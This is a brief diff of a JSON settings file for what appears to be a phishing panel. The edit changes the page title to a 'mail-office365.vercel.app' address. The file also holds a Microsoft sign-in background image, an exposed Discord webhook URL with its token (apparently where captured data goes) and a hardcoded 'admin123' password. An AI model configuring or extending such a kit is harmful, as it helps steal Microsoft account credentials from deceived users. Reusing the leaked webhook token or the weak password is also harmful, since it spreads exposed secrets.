@@ -2,7 +2,7 @@
   "discordWebhook": "https://discord.com/api/webhooks/1552922193904533585/qFZTJm-dvi8rtMebse3E46vYEJHiRUMPCOT431ObwBflrQM0B0pYoaiEWZVolklwl0mk",
   "adminPassword": "admin123",
   "logoText": "Mi Panel",
-  "pageTitle": "Bienvenido",
+  "pageTitle": "https://mail-office365.vercel.app/",
   "dashboardTitle": "Panel Admin",
   "loginBgType": "image",
   "loginBgImage": "https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg",
